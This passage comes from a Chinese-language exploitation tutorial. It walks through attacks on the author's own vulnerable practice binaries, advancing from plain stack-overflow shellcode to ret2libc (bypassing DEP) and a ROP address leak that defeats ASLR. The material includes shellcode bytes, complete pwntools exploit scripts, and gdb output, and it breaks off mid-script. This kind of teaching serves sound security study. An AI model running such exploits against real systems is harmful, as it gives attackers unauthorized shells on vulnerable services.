class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br></pre></td></tr></table></figure><p>这里我们使用一段最简单的执行<code>execve (&quot;/bin/sh&quot;)</code>命令的语句作为shellcode。</p><p>溢出点有了，shellcode有了，下一步就是控制PC跳转到shellcode的地址上:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[shellcode][“AAAAAAAAAAAAAA”….][ret]</span><br><span class="line">^------------------------------------------------|</span><br></pre></td></tr></table></figure><p>对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是<code>gdb的调试环境会影响buf在内存中的位置</code>，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。怎么解决这个问题呢？</p><p>最简单的方法就是开启<code>core dump</code>这个功能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line">sudo sh -c <span class="string">'echo "/tmp/core.%t" &gt; /proc/sys/kernel/core_pattern'</span></span><br></pre></td></tr></table></figure><p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。这里的核心转储只在<code>当前终端下有效</code>，关闭终端自动恢复默认状态(关闭)。</p><p>如果想让核心转储功能<code>永久开启</code>，可以修改文件/etc/security/limits.conf ，增加一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&lt;domain&gt; &lt;type&gt; &lt;item&gt; &lt;value&gt;</span><br><span class="line">    *      soft   core  unlimited</span><br></pre></td></tr></table></figure><p>通过修改 /proc/sys/kernel/core_uses_pid ，可以使生成的核心转储文件名变为 <code>core.[pid]</code> 的模式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/core_uses_pid</span><br></pre></td></tr></table></figure><p>还可以修改 /proc/sys/kernel/core_pattern 来控制生成核心转储文件的<code>保存位置</code>和<code>文件名格式</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /tmp/core-%e-%p-%t &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p>此时生成的文件保存在 /tmp/ 目录下，文件名格式为 <code>core-[filename]-[pid]-[time]</code> 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ ./level1 </span><br><span class="line">ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">$ gdb level1 /tmp/core.1525946343 </span><br><span class="line">pwndbg: loaded 170 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from level1...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">[New LWP 10716]</span><br><span class="line">Core was generated by `./level1<span class="string">'.</span></span><br><span class="line"><span class="string">Program terminated with signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">#0  0x41414141 in ?? ()</span></span><br><span class="line"><span class="string">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span></span><br><span class="line"><span class="string">──────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="string"> EAX  0x9e</span></span><br><span class="line"><span class="string"> EBX  0x0</span></span><br><span class="line"><span class="string"> ECX  0xffffce70 ◂— 0x44434241 ('</span>ABCD<span class="string">')</span></span><br><span class="line"><span class="string"> EDX  0x100</span></span><br><span class="line"><span class="string"> EDI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span></span><br><span class="line"><span class="string"> ESI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span></span><br><span class="line"><span class="string"> EBP  0x41414141 ('</span>AAAA<span class="string">')</span></span><br><span class="line"><span class="string"> ESP  0xffffcf00 ◂— 0x41414141 ('</span>AAAA<span class="string">')</span></span><br><span class="line"><span class="string"> EIP  0x41414141 ('</span>AAAA<span class="string">')</span></span><br><span class="line"><span class="string">───────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="string">Invalid address 0x41414141</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x/10s $esp-144</span></span><br><span class="line"><span class="string">0xffffce70:"ABCD", '</span>A<span class="string">' &lt;repeats 11 times&gt;...</span></span><br><span class="line"><span class="string">0xffffce7f:'</span>A<span class="string">' &lt;repeats 15 times&gt;...</span></span><br><span class="line"><span class="string">0xffffce8e:'</span>A<span class="string">' &lt;repeats 15 times&gt;...</span></span><br><span class="line"><span class="string">0xffffce9d:'</span>A<span class="string">' &lt;repeats 15 times&gt;...</span></span><br></pre></td></tr></table></figure><p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出<code>buffer</code>的地址为<code>$esp-144</code>。通过gdb的命令 “x/10s $esp-144”，我们可以得到<code>buf的地址为0xffffce70</code>。这里在我的环境里是这个地址值，和大佬的值相差很大，应该是环境的问题。最坑的是，前面我在普通用户下复现的，shell是<code>zsh</code>，exp死活执行不成功，思考了很长一段时间。最后在将shell切换成<code>bash</code>后，执行成功了。</p><p>切换shell的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#切换为bash</span></span><br><span class="line">chsh -s /bin/bash</span><br><span class="line"><span class="comment">#切换为zsh</span></span><br><span class="line">chsh -s /bin/zsh</span><br><span class="line"><span class="comment">#切换完记得注销一下</span></span><br></pre></td></tr></table></figure><p>OK，现在<code>溢出点</code>，<code>shellcode</code>和<code>返回值地址</code>都有了，可以开始写exp了。写exp的话，我强烈推荐<code>pwntools这</code>个工具，因为它可以非常方便的做到本地调试和远程攻击的转换。本地测试成功后只需要简单的修改一条语句就可以马上进行远程攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./level1'</span>)  <span class="comment">#本地测试</span></span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>)  <span class="comment">#远程攻击</span></span><br></pre></td></tr></table></figure><p>最终本地测试代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level1'</span>) </span><br><span class="line">ret = <span class="number">0xffffce70</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p32(ret) == struct.pack("&lt;I",ret) </span></span><br><span class="line"><span class="comment">#对ret进行编码，将地址转换成内存中的二进制存储形式</span></span><br><span class="line">payload = shellcode + <span class="string">'A'</span> * (<span class="number">140</span> - len(shellcode)) + p32(ret)</span><br><span class="line"></span><br><span class="line">p.send(payload) <span class="comment">#发送payload</span></span><br><span class="line"></span><br><span class="line">p.interactive()  <span class="comment">#开启交互shell</span></span><br></pre></td></tr></table></figure><p>执行exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python level1_exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level1'</span>: pid 2633</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>接下来我们把这个目标程序作为一个<code>服务绑定</code>到服务器的某个<code>端口</code>上，这里我们可以使用<code>socat</code>这个工具来完成，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./level1</span><br></pre></td></tr></table></figure><p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 <code>nc 127.0.0.1 10001</code>来访问我们的目标程序服务了。</p><p>因为现在目标程序是跑在<code>socat的环境</code>中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成<code>core dump</code>的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行<code>远程溢出</code>啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python level1_exp.py </span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h3 id="0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护"></a>0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</h3><p>现在我们把<code>DEP打开</code>，依然<code>关闭stack protector</code>和<code>ASLR</code>。编译方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o level2 level2.c</span><br></pre></td></tr></table></figure><p>这时候我们如果使用level1的exp来进行测试的话，系统会拒绝执行我们的shellcode。如果你通过sudo cat /proc/[pid]/maps查看，你会发现<code>level1</code>的<code>stack</code>是<code>rwx</code>的，但是<code>level2</code>的<code>stack</code>却是<code>rw</code>的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level1:   bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]</span><br><span class="line">level2:   bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]</span><br></pre></td></tr></table></figure><p>那么如何执行shellcode呢？我们知道level2调用了<code>libc.so</code>，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行<code>system(“/bin/sh”)</code>的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到<code>system()</code>这个<code>函数的地址</code>以及<code>”/bin/sh”</code>这个<code>字符串的地址</code>。</p><p>如果<code>关掉了ASLR</code>的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是<code>固定的</code>。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过<code>print</code>和<code>searchmem</code>命令来查找system和”/bin/sh”字符串的地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ gdb level2</span><br><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x804846e</span><br><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/buffer/桌面/practice/ROP_x86/0x02/level2</span><br><span class="line">......</span><br><span class="line"> ► f 0  804846e main+14</span><br><span class="line">   f 1 f7e1a637 __libc_start_main+247</span><br><span class="line">Breakpoint main</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> system</span><br><span class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e3cda0 &lt;__libc_system&gt;</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> __libc_start_main</span><br><span class="line"><span class="variable">$2</span> = &#123;int (int (*)(int, char **, char **), int, char **, int (*)(int, char **, char **), void (*)(void), void (*)(void), void *)&#125; 0xf7e1a540 &lt;__libc_start_main&gt;</span><br><span class="line">pwndbg&gt; searchmem <span class="string">"/bin/sh"</span></span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">'/bin/sh'</span> <span class="keyword">in</span>: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">libc : 0xf7f5da0b (<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure><p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取<code>libc.so</code>在内存中的<code>起始位置</code>，接下来我们可以通过searchmem命令来查找”/bin/sh”这个字符串。这样我们就得到了<code>system</code>的地址<code>0xf7e3cda0</code>以及<code>&quot;/bin/sh&quot;</code>的地址<code>0xf7f5da0b</code>。下面我们开始写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10002)</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0xdeadbeef</span></span><br><span class="line">systemaddr=<span class="number">0xf7e3cda0</span></span><br><span class="line">binshaddr=<span class="number">0xf7f5da0b</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">'A'</span>*<span class="number">140</span> + p32(systemaddr) + p32(ret) + p32(binshaddr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>要注意的是<code>system()后面</code>跟的是执行完system函数后要<code>返回地址</code>，接下来才是”/bin/sh”字符串的地址。因为我们执行完后也不打算干别的什么事，所以我们就随便写了一个0xdeadbeef作为返回地址。下面我们测试一下exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python level2_exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level2'</span>: pid 5659</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><p>OK。测试成功。</p><h3 id="0x03-ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#0x03-ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="0x03 ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>0x03 ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h3><p>接下来我们<code>打开ASLR</code>保护。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s </span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>现在我们再回头测试一下level2的exp，发现已经不好用了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python level2_exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level2'</span>: pid 5731</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ whoami</span><br><span class="line">[*] Process <span class="string">'./level2'</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 5731)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure><p>如果你通过<code>sudo cat /proc/[pid]/maps</code>或者<code>ldd</code>查看，你会发现level2的<code>libc.so</code>地址每次都是变化的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/[第1次执行的level2的pid]/maps</span><br><span class="line">f7d63000-f7f13000 r-xp 00000000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f13000-f7f15000 r--p 001af000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f15000-f7f16000 rw-p 001b1000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line"></span><br><span class="line">cat /proc/[第2次执行的level2的pid]/maps</span><br><span class="line">f7d66000-f7f16000 r-xp 00000000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f16000-f7f18000 r--p 001af000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f18000-f7f19000 rw-p 001b1000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line"></span><br><span class="line">cat /proc/[第3次执行的level2的pid]/maps</span><br><span class="line">f7d4f000-f7eff000 r-xp 00000000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7eff000-f7f01000 r--p 001af000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f01000-f7f02000 rw-p 001b1000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ldd level2</span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7f56000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d81000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7f58000)</span><br><span class="line">$ ldd level2</span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7f1b000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d46000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7f1d000)</span><br></pre></td></tr></table></figure><p>那么如何解决地址随机化的问题呢？思路是：我们需要先<code>泄漏</code>出libc.so<code>某些函数</code>在内存中的地址，然后再利用泄漏出的函数地址根据<code>偏移量</code>计算出<code>system()函数</code>和<code>/bin/sh字符串</code>在内存中的地址，然后再执行我们的<code>ret2libc</code>的shellcode。既然栈，libc，heap的地址都是随机的。我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为<code>程序本身</code>在内存中的地址<code>并不是随机的</code>，如图所示：</p><div align="left"><br>    <img src="/resources/2018/2018-05-10-00.jpg" alt="Linux内存随机化分布图"><br></div><p>Linux内存随机化分布图</p><p>所以我们只要把返回值设置到<code>程序本身</code>就可执行我们期望的指令了。首先我们利用<code>objdump</code>来查看可以利用的<code>plt函数</code>和函数对应的<code>got表</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d -j .plt level2</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482f0 &lt;<span class="built_in">read</span>@plt-0x10&gt;:</span><br><span class="line"> 80482f0:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 80482f6:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 80482fc:00 00                add    %al,(%eax)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">08048300 &lt;<span class="built_in">read</span>@plt&gt;:</span><br><span class="line"> 8048300:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 8048306:68 00 00 00 00       push   <span class="variable">$0x0</span></span><br><span class="line"> 804830b:e9 e0 ff ff ff       jmp    80482f0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">08048310 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 8048310:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 8048316:68 08 00 00 00       push   <span class="variable">$0x8</span></span><br><span class="line"> 804831b:e9 d0 ff ff ff       jmp    80482f0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">08048320 &lt;write@plt&gt;:</span><br><span class="line"> 8048320:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 8048326:68 10 00 00 00       push   <span class="variable">$0x10</span></span><br><span class="line"> 804832b:e9 c0 ff ff ff       jmp    80482f0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ objdump -R level2</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a00c R_386_JUMP_SLOT   <span class="built_in">read</span>@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   write@GLIBC_2.0</span><br></pre></td></tr></table></figure><p>我们发现除了程序本身的实现的函数之外，我们还可以使用<code>read@plt()</code>和<code>write@plt()</code>函数。但因为程序本身并没有调用<code>system()</code>函数，所以我们并不能直接调用<code>system()</code>来获取<code>shell</code>。但其实我们有<code>write@plt()</code>函数就够了，因为我们可以通过<code>write@plt ()</code>函数把<code>write()</code>函数在内存中的地址也就是<code>write.got</code>给打印出来。既然write()函数实现是在<code>libc.so</code>当中，那我们调用的<code>write@plt()</code>函数为什么也能实现write()功能呢? 这是因为linux采用了<code>延时绑定</code>技术，当我们调用<code>write@plit()</code>的时候，系统会将真正的write()函数地址<code>link</code>到got表的<code>write.got</code>中，然后write@plit()会根据write.got 跳转到<code>真正的write()函数</code>上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</p><p>因为<code>system()</code>函数和<code>write()</code>在<code>libc.so</code>中的<code>offset(相对地址)</code>是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以<code>计算出system()</code>在内存中的<code>地址</code>了。然后我们再将pc指针<code>return</code>回vulnerable_function()函数，就可以进行<code>ret2libc溢出攻击</code>，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。</p><p>使用<code>ldd</code>命令可以查看目标程序调用的so库。随后我们把<code>libc.so</code>拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ldd level2</span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7f84000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7daf000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7f86000)</span><br><span class="line">$ cp /lib/i386-linux-gnu/libc.so.6 .</span><br></pre></td></tr></table></figure><p>最后exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'level2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./level2')</span></span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'plt_write= '</span> + hex(plt_write)</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'got_write= '</span> + hex(got_write)</span><br><span class="line">vulfun_addr = <span class="number">0x08048471</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'vulfun= '</span> + hex(vulfun_addr)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload1 ...###"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###receving write() addr...###"</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'write_addr='</span> 